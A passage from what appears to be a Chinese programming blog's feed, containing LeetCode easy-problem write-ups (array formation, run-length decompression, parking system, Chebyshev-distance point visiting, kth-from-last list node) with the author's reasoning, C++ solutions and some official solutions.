<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,3,5,7], pieces &#x3D; [[2,4,6,8]]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= pieces.length &lt;= arr.length &lt;= 100</code></li>
<li><code>sum(pieces[i].length) == arr.length</code></li>
<li><code>1 &lt;= pieces[i].length &lt;= arr.length</code></li>
<li><code>1 &lt;= arr[i], pieces[i][j] &lt;= 100</code></li>
<li><code>arr</code> 中的整数 互不相同</li>
<li><code>pieces</code> 中的整数 互不相同（也就是说，如果将 <code>pieces</code> 扁平化成一维数组，数组中的所有整数互不相同）</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>因为这个提示<code>sum(pieces[i].length) == arr.length</code>，说明pieces扁平化一维数组后的元素的值都应该在数组arr中</p>
<p>遍历数组pieces，判断元素中的第一个整数是否在数组arr中，确定其位置，然后对元素数组再次遍历，判断数组中的所有值是否都在arr中连续存在。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败44.15%，内存消耗10.3M，击败53.54%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canFormArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; pieces)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历pieces</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pieces.size();++i)&#123;</span><br><span class="line">            <span class="comment">//查找数组pieces[i]的第一个元素是否存在arr中，返回指向元素的指针</span></span><br><span class="line">            <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it=find(arr.begin(),arr.end(),pieces[i][<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">//没找到</span></span><br><span class="line">            <span class="keyword">if</span>(it==arr.end())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//找到了则从找到的位置开始判断当前pieces[i]的所有元素是否都在arr中连续存在</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;pieces[i].size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(*it!=pieces[i][j])&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ++it;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，之前我好想在周赛中遇到过这道题，当时没做出来🤣，我这个效率也还行，奥利给。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>解压缩编码列表</title>
    <url>/2020/11/09/%E8%A7%A3%E5%8E%8B%E7%BC%A9%E7%BC%96%E7%A0%81%E5%88%97%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/decompress-run-length-encoded-list/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个以行程长度编码压缩的整数列表 <code>nums</code> 。</p>
<p>考虑每对相邻的两个元素 <code>[freq, val] = [nums[2*i], nums[2*i+1]]</code> （其中 <code>i &gt;= 0</code> ），每一对都表示解压后子列表中有 <code>freq</code> 个值为 <code>val</code> 的元素，你需要从左到右连接所有子列表以生成解压后的列表。</p>
<p>请你返回解压后的列表。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4]</span><br><span class="line">输出：[2,4,4,4]</span><br><span class="line">解释：第一对 [1,2] 代表着 2 的出现频次为 1，所以生成数组 [2]。</span><br><span class="line">第二对 [3,4] 代表着 4 的出现频次为 3，所以生成数组 [4,4,4]。</span><br><span class="line">最后将它们串联到一起 [2] + [4,4,4] &#x3D; [2,4,4,4]。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,2,3]</span><br><span class="line">输出：[1,3,3]</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 100</code></li>
<li><code>nums.length % 2 == 0</code></li>
<li><code>1 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历整数列表nums，对每对相邻元素，循环生成freq个值为val的元素。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败80.33%，内存消耗10.4M，击败5.58%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">decompressRLElist</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size()/<span class="number">2</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums[<span class="number">2</span>*i];++j)&#123;</span><br><span class="line">                result.push_back(nums[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/subtract-the-product-and-sum-of-digits-of-an-integer/solution/zheng-shu-de-ge-wei-ji-he-zhi-chai-by-leetcode-sol/">官方题解</a>:</h6><p><strong>方法一：模拟</strong></p>
<p>我们以步长（step）为 <code>2</code> 遍历数组 <code>nums</code>，对于当前遍历到的元素 <code>a</code> 和 <code>b</code>，我们将 <code>a</code> 个 <code>b</code> 添加进答案中即可。</p>
<p><strong>c++代码：</strong>（执行8ms，击败80.33%，内存10.4M，击败5.12%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">decompressRLElist</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums[i]; ++j) &#123;</span><br><span class="line">                ans.push_back(nums[i + <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N+∑nums_{even})$，其中 $N$ 是数组 <code>nums</code> 的长度，$∑nums_{even}$  是数组 <code>nums</code> 中所有下标为偶数的元素之和。</li>
<li>空间复杂度：$O(∑nums_{even} )$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>和官方题解思路相同，只是官方题解是设置步长为2，我是设置循环次数减半。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>设计停车系统</title>
    <url>/2020/11/07/%E8%AE%BE%E8%AE%A1%E5%81%9C%E8%BD%A6%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/design-parking-system/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>请你给一个停车场设计一个停车系统。停车场总共有三种不同大小的车位：大，中和小，每种尺寸分别有固定数目的车位。</p>
<p>请你实现 <code>ParkingSystem</code> 类：</p>
<p><code>ParkingSystem(int big, int medium, int small)</code> 初始化 <code>ParkingSystem</code> 类，三个参数分别对应每种停车位的数目。<br><code>bool addCar(int carType)</code> 检查是否有 <code>carType</code> 对应的停车位。 <code>carType</code> 有三种类型：大，中，小，分别用数字 <code>1</code>， <code>2</code> 和 <code>3</code> 表示。<strong>一辆车只能停在</strong>  <code>carType</code> 对应尺寸的停车位中。如果没有空车位，请返回 <code>false</code> ，否则将该车停入车位并返回 <code>true</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;ParkingSystem&quot;, &quot;addCar&quot;, &quot;addCar&quot;, &quot;addCar&quot;, &quot;addCar&quot;]</span><br><span class="line">[[1, 1, 0], [1], [2], [3], [1]]</span><br><span class="line">输出：</span><br><span class="line">[null, true, true, false, false]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">ParkingSystem parkingSystem &#x3D; new ParkingSystem(1, 1, 0);</span><br><span class="line">parkingSystem.addCar(1); &#x2F;&#x2F; 返回 true ，因为有 1 个空的大车位</span><br><span class="line">parkingSystem.addCar(2); &#x2F;&#x2F; 返回 true ，因为有 1 个空的中车位</span><br><span class="line">parkingSystem.addCar(3); &#x2F;&#x2F; 返回 false ，因为没有空的小车位</span><br><span class="line">parkingSystem.addCar(1); &#x2F;&#x2F; 返回 false ，因为没有空的大车位，唯一一个大车位已经被占据了</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>0 &lt;= big, medium, small &lt;= 1000</code></li>
<li><code>carType</code> 取值为 <code>1</code>， <code>2</code> 或 <code>3</code></li>
<li>最多会调用 <code>addCar</code> 函数 <code>1000</code> 次</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据车类型判断是否有对应停车位，如果有则返回true且对应停车位数量减一，否则返回false。</p>
<p><strong>c++代码：</strong>(执行用时116ms，击败89.26%，内存消耗32.8M，击败6.39%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParkingSystem</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> big,medium,small;</span><br><span class="line">    ParkingSystem(<span class="keyword">int</span> big, <span class="keyword">int</span> medium, <span class="keyword">int</span> small) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;big=big;</span><br><span class="line">        <span class="keyword">this</span>-&gt;medium=medium;</span><br><span class="line">        <span class="keyword">this</span>-&gt;small=small;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">addCar</span><span class="params">(<span class="keyword">int</span> carType)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(carType==<span class="number">1</span> &amp;&amp; big&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            --big;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(carType==<span class="number">2</span> &amp;&amp; medium&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            --medium;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(carType==<span class="number">3</span> &amp;&amp; small&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            --small;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your ParkingSystem object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * ParkingSystem* obj = new ParkingSystem(big, medium, small);</span></span><br><span class="line"><span class="comment"> * bool param_1 = obj-&gt;addCar(carType);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，简单题，也没啥总结的，Let‘s go on!。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>访问所有点的最小时间</title>
    <url>/2020/11/09/%E8%AE%BF%E9%97%AE%E6%89%80%E6%9C%89%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/minimum-time-visiting-all-points/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>平面上有 <code>n</code> 个点，点的位置用整数坐标表示 <code>points[i] = [xi, yi]</code>。请你计算访问所有这些点需要的最小时间（以秒为单位）。</p>
<p>你可以按照下面的规则在平面上移动：</p>
<ul>
<li>每一秒沿水平或者竖直方向移动一个单位长度，或者跨过对角线（可以看作在一秒内向水平和竖直方向各移动一个单位长度）。</li>
<li>必须按照数组中出现的顺序来访问这些点</li>
</ul>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/09/%E8%AE%BF%E9%97%AE%E6%89%80%E6%9C%89%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%97%B6%E9%97%B4/1626_example_1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：points &#x3D; [[1,1],[3,4],[-1,0]]</span><br><span class="line">输出：7</span><br><span class="line">解释：一条最佳的访问路径是： [1,1] -&gt; [2,2] -&gt; [3,3] -&gt; [3,4] -&gt; [2,3] -&gt; [1,2] -&gt; [0,1] -&gt; [-1,0]   </span><br><span class="line">从 [1,1] 到 [3,4] 需要 3 秒 </span><br><span class="line">从 [3,4] 到 [-1,0] 需要 4 秒</span><br><span class="line">一共需要 7 秒</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：points &#x3D; [[3,2],[-2,2]]</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>points.length == n</code></li>
<li><code>1 &lt;= n &lt;= 100</code></li>
<li><code>points[i].length == 2</code></li>
<li><code>-1000 &lt;= points[i][0], points[i][1] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>关键在于当前点到下个点需要最小时间就是两点横坐标之差与纵坐标之差中的最大值，遍历n个点依次计算到下个点所需要的最小时间，累加得到结果。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败47.67%，内存消耗9.9M，击败7.58%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minTimeToVisitAllPoints</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n=points.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp1=<span class="built_in">abs</span>(points[i][<span class="number">0</span>]-points[i+<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">int</span> tmp2=<span class="built_in">abs</span>(points[i][<span class="number">1</span>]-points[i+<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">            <span class="comment">//当前点到下个点需要时间=max（横坐标之差，纵坐标之差）</span></span><br><span class="line">            result+=tmp1&gt;tmp2?tmp1:tmp2; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/minimum-time-visiting-all-points/solution/fang-wen-suo-you-dian-de-zui-xiao-shi-jian-by-le-2/">官方题解</a>:</h6><p><strong>方法一：切比雪夫距离</strong><br>对于平面上的两个点 <code>x = (x0, x1)</code> 和 <code>y = (y0, y1)</code>，设它们横坐标距离之差为 <code>dx = |x0 - y0|</code>，纵坐标距离之差为 <code>dy = |x1 - y1|</code>，对于以下三种情况，我们可以分别计算出从 x 移动到 y 的最少次数：</p>
<p><code>dx &lt; dy</code>：沿对角线移动 <code>dx</code> 次，再竖直移动 <code>dy - dx</code> 次，总计 <code>dx + (dy - dx) = dy</code> 次；</p>
<p><code>dx == dy</code>：沿对角线移动 <code>dx</code> 次；</p>
<p><code>dx &gt; dy</code>：沿对角线移动 <code>dy</code> 次，再水平移动 <code>dx - dy</code> 次，总计 <code>dy + (dx - dy) = dx</code> 次。</p>
<p>可以发现，对于任意一种情况，从 <code>x</code> 移动到 <code>y</code> 的最少次数为 <code>dx</code> 和 <code>dy</code> 中的较大值 <code>max(dx, dy)</code>，这也被称作 <code>x</code> 和 <code>y</code> 之间的 切比雪夫距离。</p>
<p>由于题目要求，需要按照数组中出现的顺序来访问这些点。因此我们遍历整个数组，对于数组中的相邻两个点，计算出它们的切比雪夫距离，所有的距离之和即为答案。</p>
<p><strong>c++代码：</strong>（执行8ms，击败97.24%，内存9.9M，击败5.55%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minTimeToVisitAllPoints</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x0 = points[<span class="number">0</span>][<span class="number">0</span>], x1 = points[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; points.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> y0 = points[i][<span class="number">0</span>], y1 = points[i][<span class="number">1</span>];</span><br><span class="line">            ans += max(<span class="built_in">abs</span>(x0 - y0), <span class="built_in">abs</span>(x1 - y1));</span><br><span class="line">            x0 = y0;</span><br><span class="line">            x1 = y1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>和官方题解思路相同，代码稍有差别，棒棒哒😘</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>返回倒数第k个节点</title>
    <url>/2020/11/10/%E8%BF%94%E5%9B%9E%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/kth-node-from-end-of-list-lcci/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>实现一种算法，找出单向链表中倒数第 k 个节点。返回该节点的值。</p>
<p><strong>注意：</strong>本题相对原题稍作改动</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 1-&gt;2-&gt;3-&gt;4-&gt;5 和 k &#x3D; 2</span><br><span class="line">输出： 4</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<p>给定的$k$保证是有效的。</p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>和上道题<a href="https://z2bns.github.io/2020/11/10/%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/">链表中倒数第k个节点</a>基本一样，只是把返回的节点改成节点的值而已。</p>
<p>遍历链表，把每个结点指针存到vector容器中，返回倒数第k个节点的值可以直接下标获取。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败73.35%，内存消耗10.6M，击败5.61%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">kthToLast</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//结点指针容器</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; tmp;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            tmp.push_back(head);</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp[tmp.size()-k]-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，轻松加愉快🥱</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>速算机器人</title>
    <url>/2020/11/10/%E9%80%9F%E7%AE%97%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
